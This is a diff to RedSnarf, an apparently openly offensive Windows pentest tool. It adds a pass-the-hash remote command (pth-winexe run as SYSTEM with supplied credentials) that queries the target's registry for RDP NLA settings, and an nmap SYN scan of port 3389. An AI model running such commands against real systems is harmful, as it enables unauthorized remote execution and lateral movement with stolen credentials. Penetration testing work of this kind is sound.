@@ -1723,7 +1723,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3t", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3u", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1981,11 +1981,27 @@ elif remotetargets[0:6]=='range=':
 if rdp_connect in yesanswers or "ID" in rdp_connect:
 	
 	rdp_sessions = []
+	
+	#Check to see if NLA is turned on
+	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+	NLAStatus = proc.communicate()[0]
 
-	#Todo
-	#add check for NLA
-	#os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+	#Error if NLA is turned on
+	if "0x1" in NLAStatus:
+		print colored("\n[-]We've detected that NLA is turned on (try -rN d to turn off), this may not work.",'yellow')
+		print colored("[-]xfreerdp is a good alternative to rdesktop for NLA issues....",'yellow')
+		usr_response = raw_input("\nPlease any key to continue or q to exit: ")
+		if usr_response.upper() =="Q":
+			sys.exit()
 
+	#Check to see port 3389 is open
+	scanv = subprocess.Popen(["nmap", "-sS", "-p3389","--open", targets[0]], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
+	if not "open" in scanv:
+		print colored("\n[-]We can't detect port 3389 as open, this might not work!..",'yellow')
+		print colored("\n[-]Try -rR e to enable RDP service and open port",'yellow')
+		usr_response = raw_input("\nPlease any key to continue or q to exit: ")
+		if usr_response.upper() =="Q":
+			sys.exit()		
 
 	if "ID" in rdp_connect:
 		if len(targets)==1:
